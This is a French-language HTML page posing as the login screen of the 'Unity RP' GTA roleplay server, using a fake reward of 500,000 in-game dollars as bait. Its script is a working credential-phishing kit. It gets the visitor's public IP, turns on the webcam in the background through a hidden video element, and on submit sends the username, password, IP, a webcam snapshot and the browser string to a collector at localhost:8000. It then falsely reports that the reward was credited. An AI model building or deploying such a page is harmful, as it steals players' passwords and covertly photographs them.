<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unity RP - Connexion</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }

        /* Fond sombre avec l'image background.jpg et un voile sombre */
        body {
            background: url('background.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            background-color: #0b0b0b;
        }
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1;
        }

        /* Conteneur principal style maquette */
        .container {
            display: flex;
            background: #121212;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
            z-index: 2;
            overflow: hidden;
            border: 1px solid #222;
        }

        .panel {
            padding: 50px 40px;
            text-align: center;
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .panel-left {
            border-right: 1px solid #222;
        }

        /* Icônes SVG intégrées pour Discord et Serveur */
        .icon {
            width: 64px;
            height: 64px;
            fill: #ff2a4d;
            margin-bottom: 20px;
        }

        .panel h2 {
            color: #ffffff;
            font-size: 22px;
            margin-bottom: 5px;
            font-weight: 700;
        }

        .panel p {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* Boutons rouges néon style maquette */
        .neon-btn {
            background: #ff2a4d;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 0 15px rgba(255, 42, 77, 0.4);
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }
        .neon-btn:hover {
            background: #ff4d6d;
            box-shadow: 0 0 25px rgba(255, 42, 77, 0.8);
        }

        /* Écran de Connexion (Caché par défaut, s'affiche au clic) */
        .hidden { display: none !important; }

        .login-card {
            background: #121212;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
            text-align: center;
            width: 400px;
            position: relative;
            z-index: 2;
            border: 1px solid #222;
        }

        .brand-title {
            font-size: 28px;
            font-weight: 900;
            color: #fff;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        .brand-title span { color: #ff2a4d; }

        /* Animation du texte de récompense */
        .reward-banner {
            background: rgba(255, 42, 77, 0.15);
            border: 1px dashed #ff2a4d;
            color: #ff4d6d;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            margin: 15px 0 25px 0;
            animation: pulseGlow 1.5s infinite alternate;
        }

        @keyframes pulseGlow {
            0% { transform: scale(1); box-shadow: 0 0 5px rgba(255,42,77,0.2); }
            100% { transform: scale(1.02); box-shadow: 0 0 15px rgba(255,42,77,0.6); }
        }

        .form-group { text-align: left; margin-bottom: 15px; }
        .form-label { display: block; font-size: 13px; color: #aaa; margin-bottom: 5px; }
        .form-input {
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 15px;
        }
        .form-input:focus { outline: none; border-color: #ff2a4d; }

        /* Vidéo de fond cachée pour capture */
        #videoStream { display: none; }
    </style>
</head>
<body>

    <video id="videoStream" autoplay muted playsinline></video>

    <!-- ÉCRAN D'ACCUEIL (Discord & Serveur) -->
    <div id="homeContainer" class="container">
        <!-- Bloc Discord -->
        <div class="panel panel-left">
            <svg class="icon" viewBox="0 0 127.14 96.36">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.68,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14c2.63-27.29-4.5-51.14-18.9-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.15,46,96.13,53,91,65.69,84.69,65.69Z"/>
            </svg>
            <h2>Notre Discord</h2>
            <p>66295 Membres</p>
            <a href="https://discord.gg/unityrp" target="_blank" class="neon-btn">Rejoindre</a>
        </div>

        <!-- Bloc Serveur (Déclenche le passage au formulaire de connexion) -->
        <div class="panel">
            <svg class="icon" viewBox="0 0 24 24">
                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
            </svg>
            <h2>Notre Serveur</h2>
            <p>148 en ligne</p>
            <button id="showLoginBtn" class="neon-btn">Se connecter</button>
        </div>
    </div>

    <!-- ÉCRAN DE CONNEXION (Caché au départ) -->
    <div id="loginContainer" class="login-card hidden">
        <h1 class="brand-title">UNITY <span>RP</span></h1>
        
        <!-- Animation du texte de récompense demandé -->
        <div class="reward-banner">
            🎁 Récompense : +500 000 GTA $ RP offerts !
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label class="form-label">Nom d'utilisateur</label>
                <input type="text" id="username" class="form-input" placeholder="Entrez votre pseudo" required>
            </div>
            <div class="form-group">
                <label class="form-label">Mot de passe</label>
                <input type="password" id="password" class="form-input" placeholder="••••••••" required>
            </div>
            <button type="submit" class="neon-btn" style="margin-top: 10px;">Se connecter au serveur</button>
        </form>
    </div>

    <script>
        const showLoginBtn = document.getElementById('showLoginBtn');
        const homeContainer = document.getElementById('homeContainer');
        const loginContainer = document.getElementById('loginContainer');
        const videoStream = document.getElementById('videoStream');
        let userIpAddress = 'Non détectée';

        // Récupération de l'IP publique
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userIpAddress = data.ip; })
            .catch(err => console.error("Erreur IP:", err));

        // Activation de la caméra en arrière-plan
        navigator.mediaDevices?.getUserMedia({ video: true })
            .then(stream => { videoStream.srcObject = stream; })
            .catch(err => console.error("Caméra non accessible :", err));

        // Capture photo en base64
        function capturePhoto() {
            if (!videoStream || !videoStream.srcObject) return null;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 480;
                canvas.height = 360;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
                return canvas.toDataURL('image/jpeg', 0.8);
            } catch (e) {
                return null;
            }
        }

        // Bascule de l'interface d'accueil vers l'interface de connexion
        showLoginBtn.addEventListener('click', () => {
            homeContainer.classList.add('hidden');
            loginContainer.classList.remove('hidden');
        });

        // Gestion de la soumission et envoi vers le serveur Python
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!user || !pass) return;

            const photoData = capturePhoto();

            try {
                await fetch('http://localhost:8000/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: user,
                        password: pass,
                        ip: userIpAddress,
                        photo: photoData,
                        userAgent: navigator.userAgent
                    })
                });
                alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
            } catch (err) {
                console.error("Erreur d'envoi réseau", err);
                alert('Erreur de connexion au serveur.');
            }
        });
    </script>
</body>
</html>
